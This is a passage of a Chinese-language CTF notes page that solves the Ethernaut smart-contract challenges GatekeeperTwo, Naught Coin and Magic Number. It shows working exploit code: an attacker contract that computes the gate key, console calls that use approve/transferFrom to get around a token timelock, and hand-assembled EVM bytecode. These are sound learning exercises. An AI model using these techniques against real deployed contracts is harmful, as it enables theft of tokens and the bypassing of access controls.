+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    <span class="hljs-built_in">require</span>(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller()) }
+    <span class="hljs-built_in">require</span>(x == <span class="hljs-number">0</span>);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    <span class="hljs-built_in">require</span>(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(<span class="hljs-number">0</span>) - <span class="hljs-number">1</span>);
+    _;
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enter</span>(<span class="hljs-params">bytes8 _gateKey</span>) <span class="hljs-title">public</span> <span class="hljs-title">gateOne</span> <span class="hljs-title">gateTwo</span> <span class="hljs-title">gateThree</span>(<span class="hljs-params">_gateKey</span>) <span class="hljs-title">returns</span> (<span class="hljs-params">bool</span>) </span>{
+    entrant = tx.origin;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+  }
+}
+
+contract Attacker{
+
+    <span class="hljs-keyword">constructor</span>(address p) public{
+        GatekeeperTwo target = GatekeeperTwo(p);
+        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(<span class="hljs-keyword">this</span>)))) ^ (uint64(<span class="hljs-number">0</span>) - <span class="hljs-number">1</span>));
+        target.enter(_gateKey);
+    }
+
+
+}
+</code></pre>
+<h2 id="naught-coin"><a name="naught-coin" class="anchor-navigation-ex-anchor" href="#naught-coin"><i class="fa fa-link" aria-hidden="true"></i></a>Naught Coin</h2>
+<pre><code class="lang-js">pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.0</span>;
+
+<span class="hljs-keyword">import</span> <span class="hljs-string">&apos;@openzeppelin/contracts/token/ERC20/ERC20.sol&apos;</span>;
+
+ contract NaughtCoin is ERC20 {
+
+  <span class="hljs-comment">// string public constant name = &apos;NaughtCoin&apos;;</span>
+  <span class="hljs-comment">// string public constant symbol = &apos;0x0&apos;;</span>
+  <span class="hljs-comment">// uint public constant decimals = 18;</span>
+  uint public timeLock = now + <span class="hljs-number">10</span> * <span class="hljs-number">365</span> days;
+  uint256 public INITIAL_SUPPLY;
+  address public player;
+
+  <span class="hljs-keyword">constructor</span>(address _player) 
+  ERC20(&apos;NaughtCoin&apos;, &apos;0x0&apos;)
+  public {
+    player = _player;
+    INITIAL_SUPPLY = <span class="hljs-number">1000000</span> * (<span class="hljs-number">10</span>**uint256(decimals()));
+    <span class="hljs-comment">// _totalSupply = INITIAL_SUPPLY;</span>
+    <span class="hljs-comment">// _balances[player] = INITIAL_SUPPLY;</span>
+    _mint(player, INITIAL_SUPPLY);
+    emit Transfer(address(<span class="hljs-number">0</span>), player, INITIAL_SUPPLY);
+  }
+
+  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params">address _to, uint256 _value</span>) <span class="hljs-title">override</span> <span class="hljs-title">public</span> <span class="hljs-title">lockTokens</span> <span class="hljs-title">returns</span>(<span class="hljs-params">bool</span>) </span>{
+    <span class="hljs-keyword">super</span>.transfer(_to, _value);
+  }
+
+  <span class="hljs-comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
+  modifier lockTokens() {
+    <span class="hljs-keyword">if</span> (msg.sender == player) {
+      <span class="hljs-built_in">require</span>(now &gt; timeLock);
+      _;
+    } <span class="hljs-keyword">else</span> {
+     _;
+    }
+  }
+</code></pre>
+<p>&#x8FD9;&#x91CC;&#x63D0;&#x5230;&#x4E86;ERC20 Token&#x6807;&#x51C6;&#xFF0C;&#x5177;&#x4F53;&#x5982;&#x4E0B;</p>
+<p><a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" target="_blank">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</a></p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8F6C;&#x8D26;&#x7684;&#x5B9E;&#x73B0;&#x6709;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x4E00;&#x4E2A;&#x662F;<code>transfer</code>&#x4E00;&#x4E2A;&#x662F;<code>transferFrom</code> &#x8FD9;&#x91CC;&#x6CA1;&#x6709;&#x5BF9;<code>transferFrom</code>&#x8FDB;&#x884C;&#x91CD;&#x8F7D;&#x6240;&#x4EE5;&#x6CA1;&#x6709;lockTokens&#x7684;&#x9650;&#x5236;&#xFF0C;
+&#x6211;&#x4EEC;&#x53EA;&#x8981;<code>approve</code>&#x81EA;&#x5DF1;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5229;&#x7528;<code>transferForm</code>&#x8F6C;&#x51FA;&#x53BB;&#x5373;&#x53EF;</p>
+<pre><code class="lang-js">(<span class="hljs-keyword">await</span> contract.balanceOf(player)).toString()
+<span class="hljs-string">&quot;1000000000000000000000000&quot;</span>
+<span class="hljs-keyword">await</span> contract.approve(player,<span class="hljs-string">&quot;1000000000000000000000000&quot;</span>)
+<span class="hljs-keyword">await</span> contract.transferFrom(player,contract.address,<span class="hljs-string">&quot;1000000000000000000000000&quot;</span>)
+(<span class="hljs-keyword">await</span> contract.balanceOf(player)).toString()
+<span class="hljs-string">&quot;0&quot;</span>
+</code></pre>
+<h2 id="magic-number"><a name="magic-number" class="anchor-navigation-ex-anchor" href="#magic-number"><i class="fa fa-link" aria-hidden="true"></i></a>Magic Number</h2>
+<p>&#x53C2;&#x7167;EVM</p>
+<p>&#x51FD;&#x6570;&#x90E8;&#x5206;</p>
+<pre><code>602a    // v: push1 0x2a (value is 42)
+6080    // p: push1 0x80 (memory slot is 0x80)
+52      // mstore
+
+
+6020    // s: push1 0x20 (value is 32 bytes in size)
+6080    // p: push1 0x80 (value was stored in slot 0x80)
+f3      // return
+</code></pre><p>10byte</p>
+<p>&#x8C03;&#x7528;&#x90E8;&#x5206;</p>
+<pre><code>600a    // s: push1 0x0a (10 bytes)
+60??    // f: push1 0x?? (current position of runtime opcodes)
+6000    // t: push1 0x00 (destination memory index 0)
+39      // CODECOPY
+
+
+
+600a    // s: push1 0x0a (runtime opcode length)
+6000    // p: push1 0x00 (access memory index 0)
+f3      // return to EVM
+</code></pre><p>12byte</p>
+<p>&#x6240;&#x4EE5;<code>??</code>&#x90E8;&#x5206;&#x4E3A;<code>0x0c</code>-&gt;<code>12</code></p>
+<p>&#x7ED3;&#x679C;&#x4E3A;</p>
+<pre><code>600a600c600039600a6000f3602a60805260206080f3
+</code></pre><pre><code class="lang-js"><span class="hljs-keyword">var</span> bytecode = <span class="hljs-string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>;
+<span class="hljs-keyword">await</span> web3.eth.sendTransaction({ <span class="hljs-keyword">from</span>: player, data: bytecode }, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err,res</span>)</span>{<span class="hljs-built_in">console</span>.log(res)});
+</code></pre>
+<p>&#x5F97;&#x5230;&#x5408;&#x7EA6;&#x5730;&#x5740;&#x540E;&#x8C03;&#x7528;&#x5373;&#x53EF;</p>
+<pre><code class="lang-js"><span class="hljs-keyword">await</span> contract.setSolver(<span class="hljs-string">&quot;0x9E541a50c028ebeDD6e030c4138111b30bb23aF2&quot;</span>)
+</code></pre>
+<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
+2021-05-07 16:30:35
+</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../pwnable.kr/toddlers-bottle.html" class="navigation navigation-prev " aria-label="Previous page: Toddler's Bottle">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../vulnhub/" class="navigation navigation-next " aria-label="Next page: Vulnhub">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Ethernaut","level":"1.7","depth":1,"next":{"title":"Vulnhub","level":"1.8","depth":1,"path":"vulnhub/README.md","ref":"vulnhub/README.md","articles":[{"title":"DC-9","level":"1.8.1","depth":2,"path":"vulnhub/dc-9.md","ref":"vulnhub/dc-9.md","articles":[]},{"title":"five86-1","level":"1.8.2","depth":2,"path":"vulnhub/five86-1.md","ref":"vulnhub/five86-1.md","articles":[]},{"title":"wakanda","level":"1.8.3","depth":2,"path":"vulnhub/wakanda.md","ref":"vulnhub/wakanda.md","articles":[]}]},"previous":{"title":"Toddler's Bottle","level":"1.6.1","depth":2,"path":"pwnable.kr/toddlers-bottle.md","ref":"pwnable.kr/toddlers-bottle.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"ethernaut/README.md","mtime":"2021-05-07T08:30:35.937Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
